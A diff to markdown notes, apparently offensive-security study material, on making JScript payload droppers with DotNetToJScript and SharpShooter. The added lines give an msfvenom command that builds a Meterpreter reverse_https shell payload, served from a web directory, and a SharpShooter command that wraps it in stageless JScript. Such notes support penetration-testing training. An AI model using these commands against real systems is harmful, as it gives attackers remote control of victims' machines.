@@ -18,3 +18,17 @@ DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
 ```
 
 Now, We can modify the default TestClass.cs to write our [payload dropper](/ClientSideWithWindowsScriptHost/TestClass.cs ) in c# and conver it to jscript using the same DotNetToJScript.exe command.
+
+The above method can also be done by using [SharpShoter](https://github.com/mdsecactivebreach/SharpShooter) framework.
+
+First,Create a raw payload
+
+```
+sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ip LPORT=443 -f raw -o /var/www/html/shell.txt
+```
+
+then invoke SharpShooter.py to compile js code
+
+```
+sudo python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test
+```
